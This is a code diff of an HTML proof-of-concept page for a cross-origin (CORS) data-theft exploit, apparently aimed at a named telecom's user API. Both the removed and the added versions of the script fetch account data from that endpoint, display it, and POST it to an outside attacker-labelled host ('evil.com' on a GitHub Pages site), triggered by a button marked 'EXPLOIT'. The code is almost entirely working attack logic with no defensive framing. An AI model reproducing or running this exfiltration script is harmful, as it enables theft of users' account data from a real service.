@@ -35,27 +35,29 @@
     <button type="button" onclick="cors()" class="inline-button" >EXPLOIT</button>
     <p id="demo"></p>
     <script>
-    function cors(){
-        var xhttp = new XMLHttpRequest();
+   function cors(){
+    var xhttp = new XMLHttpRequest();
 
-    xhttp.open("GET", "https:/vodafone.om/api/backend/ajax/v1/users", true);
-    xhttp.setRequestHeader("Content-type", "application/json"); // Set appropriate headers if needed
+    // Make an authenticated request
+    xhttp.open("GET", "https://vodafone.om/api/backend/ajax/v1/users", true);
+    xhttp.setRequestHeader("Authorization", "Bearer your-jwt-token"); // Add JWT token here
+    xhttp.setRequestHeader("Content-type", "application/json"); 
     xhttp.send();
-        xhttp.onreadystatechange = function(){
-            if(this.readyState == 4 && this.status == 200) {
-                var a = this.responseText ; // Sensitive data from user account
-                document.getElementById("demo").innerHTML =a;
-                xhttp.open("POST","https://salamoxso.github.io/evil.com/",true);// Sending that data to Attacker's website
-                console.log(a);
-                xhttp.send("data ="+a);
-            }
-          
 
-        };
-        xhttp.open("GET","https:/vodafone.om/api/backend/ajax/v1/users",true);
-        xhttp.withCredentials = true;
-        xhttp.send();
-    }
+    xhttp.onreadystatechange = function(){
+        if(this.readyState == 4 && this.status == 200) {
+            var response = this.responseText; 
+            document.getElementById("demo").innerHTML = response;
+            console.log(response);
+
+            // Sending data to the malicious server
+            xhttp.open("POST", "https://salamoxso.github.io/evil.com/", true);
+            xhttp.setRequestHeader("Content-type", "application/json");
+            xhttp.send("data=" + response);
+        }
+    };
+}
+
     </script>
 </body>
 </html>
